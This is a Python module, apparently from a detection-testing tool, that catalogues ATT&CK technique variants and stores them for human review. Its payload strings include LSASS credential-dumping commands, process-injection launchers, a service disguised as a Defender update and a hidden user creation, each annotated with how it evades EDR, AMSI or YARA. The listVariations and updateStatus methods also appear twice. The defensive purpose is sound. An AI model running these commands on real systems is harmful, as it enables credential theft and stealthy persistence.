import uuid
import datetime
from database import get_connection

TECHNIQUE_VARIANTS_KNOWLEDGE = {
    "T1059.001": [
        {
            "desc": "PowerShell -EncodedCommand with Base64 obfuscation & tick bypass",
            "payload": "powershell.exe -e-n-c-o-d-e-d-c-o-m-m-a-n-d V3JpdGUtT3V0cHV0ICdBTVNJX0JZUEFTUyc=",
            "evasion": "Evades simple string pattern match on 'powershell.exe -c' and basic commandline tokenizers."
        },
        {
            "desc": "IEX string concatenation with environment variable expansion",
            "payload": "$env:c1='Invoke-'; $env:c2='Expression'; &($env:c1+$env:c2) ('Write-'+'Output SafePayload')",
            "evasion": "Bypasses AST and AMSI keyword scanners by assembling cmdlets dynamically at runtime."
        },
        {
            "desc": "PowerShell execution via unmanaged runspace in C# wrapper",
            "payload": "rundll32.exe C:\\Tools\\RunspaceHost.dll,Exec 'Get-Process lsass'",
            "evasion": "Launches PowerShell engine without invoking powershell.exe binary directly."
        }
    ],
    "T1003.001": [
        {
            "desc": "NanoDump via reflective load avoiding direct OpenProcess handle",
            "payload": "rundll32.exe .\\nanodump.dll,MiniDump --fork --elevate-handle",
            "evasion": "Forks LSASS process handle to prevent Sysmon EID 10 alert on direct LSASS memory read."
        },
        {
            "desc": "comsvcs.dll MiniDump via rundll32 with ordinal invocation (#24)",
            "payload": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, #24 672 %TEMP%\\ls.dmp full",
            "evasion": "Uses built-in LOLBin comsvcs.dll without touching mimikatz sekurlsa binary signatures."
        },
        {
            "desc": "ProcDump clone using native NtReadVirtualMemory syscall stubs",
            "payload": "procdump64.exe -ma lsass.exe %TEMP%\\lsass_raw.dmp -r",
            "evasion": "Direct syscall invocation bypassing EDR user-mode API hooks on kernel32!MiniDumpWriteDump."
        }
    ],
    "T1055.012": [
        {
            "desc": "Early Bird APC queue injection into suspended svchost.exe",
            "payload": "powershell.exe -ExecutionPolicy Bypass -Command \".\\EarlyBird.ps1 -Target svchost.exe\"",
            "evasion": "Injects payload into thread APC queue before main thread execution, avoiding process hollowing monitors."
        },
        {
            "desc": "Process Hollowing with section unmapping into spoolsv.exe",
            "payload": "rundll32.exe .\\hollower.dll,InjectTarget spoolsv.exe",
            "evasion": "Replaces image base in memory space while preserving original PE header characteristics."
        }
    ],
    "T1078": [
        {
            "desc": "RDP authentication using renamed local guest account promoted to Remote Desktop Users",
            "payload": "cmdkey /generic:TERMSRV/lab-dc01 /user:DefaultAccount /pass:P@ssw0rd99!",
            "evasion": "Bypasses detection rules that only inspect known 'Administrator' or 'Admin' user accounts."
        },
        {
            "desc": "WMI authentication using WinRM Kerberos ticket pass-through",
            "payload": "winrs -r:lab-dc01 -u:lab\\service_acc \"whoami\"",
            "evasion": "Avoids interactive logon event 4624 Type 2, appearing as benign service authentication."
        }
    ],
    "T1021.001": [
        {
            "desc": "RDP over SSH local port forward tunnel",
            "payload": "ssh -L 3390:127.0.0.1:3389 lab-dc01 -N -f",
            "evasion": "Encapsulates RDP 3389 traffic inside encrypted SSH session on non-standard port."
        }
    ],
    "T1027.002": [
        {
            "desc": "UPX packed executable with modified section headers and scrambled magic bytes",
            "payload": "upx.exe -9 --overlay=strip -o payload_stealth.exe raw.exe",
            "evasion": "Corrupts 'UPX0' section names so signature-based yara rules fail to trigger."
        }
    ],
    "T1082": [
        {
            "desc": "WMI/CIM query for OS architecture avoiding systeminfo.exe subprocess creation",
            "payload": "powershell.exe -c \"Get-CimInstance Win32_OperatingSystem | Select Caption, OSArchitecture\"",
            "evasion": "Avoids spawning systeminfo.exe and cmd.exe child processes."
        }
    ],
    "T1105": [
        {
            "desc": "Ingress Tool Transfer via certutil with alternative RFC 2397 data URI",
            "payload": "certutil.exe -urlcache -split -f data:text/plain;base64,TVqQ... %TEMP%\\agent.exe",
            "evasion": "Evades proxy URL filter by retrieving embedded Base64 data without outbound HTTP request."
        }
    ],
    "T1569.002": [
        {
            "desc": "Service creation with rundll32 entry point and stealth service name",
            "payload": "sc.exe create WinDefUpdate binPath= \"rundll32.exe %TEMP%\\svc.dll,ServiceMain\"",
            "evasion": "Masquerades as legitimate Windows Defender service update."
        }
    ],
    "T1136.001": [
        {
            "desc": "Net user creation via Active Directory ADSI COM object without invoking net.exe",
            "payload": "$c = [ADSI]\"WinNT://$env:COMPUTERNAME\"; $u = $c.Create('user', 'SecAuditSvc'); $u.SetPassword('P@ss!'); $u.SetInfo()",
            "evasion": "Bypasses process creation rules for net.exe and net1.exe."
        }
    ]
}

class VariationEngine:
    def __init__(self):
        self.llmApiEndpoint = "detectiq_variation_llm_v2"

    def getNextVariationId(self) -> str:
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("SELECT id FROM variations WHERE id LIKE 'VAR-AI-%' ORDER BY id DESC LIMIT 1")
        row = cur.fetchone()
        conn.close()
        if row:
            try:
                num = int(row[0].replace("VAR-AI-", "")) + 1
                return f"VAR-AI-{num:03d}"
            except ValueError:
                pass
        return f"VAR-AI-{str(uuid.uuid4())[:4].upper()}"

    def generateVariations(self, baseTechnique: str, prompt: str) -> dict:
        var_id = self.getNextVariationId()
        
        # Pick or synthesize a realistic variation matching the technique and prompt
        known = TECHNIQUE_VARIANTS_KNOWLEDGE.get(baseTechnique, [])
        if known:
            # Deterministically or intelligently pick / tailor
            import random
            choice = random.choice(known)
            description = f"{choice['desc']}"
            if prompt:
                description += f" [Guided: {prompt[:40]}...]" if len(prompt) > 40 else f" [Guided: {prompt}]"
            payload = choice["payload"]
        else:
            description = f"AI-Synthesized evasion variant for {baseTechnique}: {prompt or 'Dynamic heuristic evasion'}"
            payload = f"cmd.exe /c echo 'Simulated AI evasion payload for {baseTechnique}'"

        conn = get_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO variations (id, technique_id, method, description, status, source, llm_prompt, payload, created_at)
            VALUES (?, ?, 'LLM', ?, 'pending_review', 'llm', ?, ?, CURRENT_TIMESTAMP)
        """, (var_id, baseTechnique, description, prompt or "Autonomous variation generation", payload))
        conn.commit()
        conn.close()

        return {
            "id": var_id,
            "techniqueId": baseTechnique,
            "method": "LLM",
            "description": description,
            "status": "pending_review",
            "source": "llm",
            "llmPrompt": prompt,
            "payload": payload
        }

    def listVariations(self, technique_id: str = None) -> list:
        conn = get_connection()
        cur = conn.cursor()
        if technique_id:
            cur.execute("SELECT * FROM variations WHERE technique_id = ? ORDER BY created_at DESC", (technique_id,))
        else:
            cur.execute("SELECT * FROM variations ORDER BY created_at DESC")
        rows = cur.fetchall()
        conn.close()
        return [
            {
                "id": r["id"],
                "techniqueId": r["technique_id"],
                "method": r["method"],
                "description": r["description"],
                "status": r["status"],
                "source": r["source"],
                "llmPrompt": r["llm_prompt"],
                "payload": r["payload"],
                "createdAt": r["created_at"]
            }
            for r in rows
        ]

    def updateStatus(self, var_id: str, status: str) -> bool:
        if status not in ["approved", "rejected", "pending_review"]:
            return False
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("UPDATE variations SET status = ? WHERE id = ?", (status, var_id))
        affected = cur.rowcount
        conn.commit()
        conn.close()
        return affected > 0


    def listVariations(self, technique_id: str = None) -> list:
        conn = get_connection()
        cur = conn.cursor()
        if technique_id:
            cur.execute("SELECT * FROM variations WHERE technique_id = ? ORDER BY created_at DESC", (technique_id,))
        else:
            cur.execute("SELECT * FROM variations ORDER BY created_at DESC")
        rows = cur.fetchall()
        conn.close()
        return [
            {
                "id": r["id"],
                "techniqueId": r["technique_id"],
                "method": r["method"],
                "description": r["description"],
                "status": r["status"],
                "source": r["source"],
                "llmPrompt": r["llm_prompt"],
                "payload": r["payload"],
                "createdAt": r["created_at"]
            }
            for r in rows
        ]

    def updateStatus(self, var_id: str, status: str) -> bool:
        if status not in ["approved", "rejected", "pending_review"]:
            return False
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("UPDATE variations SET status = ? WHERE id = ?", (status, var_id))
        affected = cur.rowcount
        conn.commit()
        conn.close()
        return affected > 0